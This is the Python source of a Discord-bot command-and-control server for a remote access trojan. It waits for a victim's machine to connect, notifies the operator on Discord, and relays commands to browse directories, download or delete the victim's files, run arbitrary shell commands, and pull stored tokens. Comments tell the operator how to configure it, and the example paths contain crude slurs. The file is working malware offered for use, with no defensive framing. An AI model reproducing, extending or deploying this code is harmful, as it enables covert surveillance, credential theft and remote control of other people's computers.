##            ALSO KEEP IN MIND THAT IF YOU SPECIFY THE WRONG PATH FOR A FILE IN THE TARGET MACHINE THE CLIENT WILL CRASH SO YOU WILL NO LONGER HAVE ACCESS TO IT ##
# An example on how you should use commands is --> ">command download C://Users//gaygay//Desktop//1.jpg" or ">command viewdir C://Users
# Port and ip go to line 32 and 33
# On line 44 and 45 add the channel(id) and your user id where you want to be notified for a new connection.

import os
from os import DirEntry
from typing import TextIO
import discord
from discord import client
from discord import channel
from discord.ext import commands
import time
import socket
import json
from discord.ext.commands.core import check

with open("config.json", 'r') as configuration:
    data = json.loads(configuration.read())
    TOKEN = data['token']

intents = discord.Intents.all()
intents.members = True

bot = commands.Bot(case_insensitive=True, command_prefix = '>', intents=intents)
bot.remove_command("help")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

ip = ''
port = 80

server.bind((ip, port))
print(f'Server is running {ip}\n')
print('Waiting for connections.\n')
server.listen(3)
conn, addr = server.accept()
print(f'{addr} has connected to the server.\n')

@bot.event
async def on_ready():
    print(f"{bot.user} is ready.")
    channel = bot.get_channel(883715102702973038)
    await channel.send(f'<@YourDiscordID> new connection from\n ```{addr}```')

@bot.command()
async def connections(ctx):
    await ctx.send(f'Connected by: {addr}')

@bot.command()
async def command(ctx, data, dir=None):

        command = data
        if command == "cwd":
            conn.send(command.encode())
            files = conn.recv(5000)
            files = files.decode()
            await ctx.send(f"Currently working directory of the target {addr}: is\n {files}")

        elif command == "viewdir":
            directory = dir       
            if directory == None:
                await ctx.send("You need to provide a directory name. EX: >command view_dir C://Users")
            else:
                conn.send(command.encode())
                conn.send(directory.encode())
                files = conn.recv(5000)
                files = files.decode()
                await ctx.send(f"Currently files in the {directory} of the {addr} are:\n {files}")

        elif command == "download":
            filepath = dir
            if filepath == None:
                await ctx.send("You need to provide a valid file PATH. Ex: >command download_file C://Users//Gay//Pictures//oc.PNG")
            else:
                conn.send(command.encode())
                conn.send(filepath.encode())
                file = conn.recv(100000)
                newfile = open('file', "wb")
                newfile.write(file)
                newfile.close
                await ctx.send(file=discord.File('file'))

        elif command == "remove":
            filedir = dir
            if filedir == None:
                await ctx.send("You need to provide a valid file PATH. Ex: >command remove_file C://Users//Gay//Pictures//oc.PNG")
            else:
                conn.send(command.encode())
                conn.send(filedir.encode())

        elif command == "shell":
            cmd = dir
            if cmd == None:
                await ctx.send("You need to enter a command to be executed on the clients machine.")
            else:
                conn.send(command.encode())
                conn.send(dir.encode())
                data = conn.recv(5000)
                data = data.decode()
                await ctx.send(f'The command results are:\n {data}')

        elif command == "tokens":
            conn.send(command.encode())
            token = conn.recv(7000)
            token = token.decode()
            await ctx.send(f"The tokens of the target machine are:\n {token}")

        else:
            await ctx.send("Invalid command.")

bot.run(TOKEN)